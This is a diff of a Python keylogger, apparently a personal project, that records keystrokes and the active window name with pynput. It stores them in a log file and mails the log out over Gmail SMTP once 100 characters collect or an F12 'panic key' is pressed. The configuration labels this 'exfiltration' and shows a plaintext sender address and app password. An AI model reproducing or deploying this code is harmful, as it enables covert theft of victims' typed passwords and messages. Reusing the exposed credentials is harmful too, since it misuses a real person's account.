@@ -13,12 +13,12 @@ from pynput import keyboard
 # CONFIGURACIÓN DE EXFILTRACIÓN Y ARCHIVOS
 # ==========================================
 EMAIL_EMISOR = "josemanueldavalossanchez37@gmail.com"
-EMAIL_PASSWORD = "vato ijpk ekys nefw"  # Contraseña de aplicación generada en Gmail
+EMAIL_PASSWORD = "vato ijpk ekys nefw"  
 EMAIL_RECEPTOR = "josemanueldavalossanchez37@gmail.com"
 
-N_CARACTERES = 100  # Límite de caracteres para exfiltrar por correo
+N_CARACTERES = 100  
 ARCHIVO_LOG = "actividad_log.txt"
-TECLA_PANICO = keyboard.Key.f12  # Tecla de pánico para forzar el envío inmediato
+TECLA_PANICO = keyboard.Key.f12 
 
 # Variables globales
 ventana_actual = ""
@@ -60,9 +60,7 @@ def obtener_ventana_universal():
   return "Desconocido"
 
 
-# ==========================================
-# PERSISTENCIA LOCAL
-# ==========================================
+
 def guardar_en_archivo(texto):
   """Escribe en el archivo .txt solo cuando hay nuevos caracteres."""
   if texto:
@@ -70,9 +68,7 @@ def guardar_en_archivo(texto):
       f.write(texto)
 
 
-# ==========================================
-# EXFILTRACIÓN POR CORREO
-# ==========================================
+
 def enviar_correo():
   """Envía el archivo acumulado por SMTP."""
   if not os.path.exists(ARCHIVO_LOG) or os.path.getsize(ARCHIVO_LOG) == 0:
@@ -148,7 +144,7 @@ def al_presionar(tecla):
     print(encabezado, end="")
     procesar_entrada(encabezado)
 
-  # Obtener el carácter o tecla especial
+ 
   try:
     char = tecla.char
     print(char, end="", flush=True)
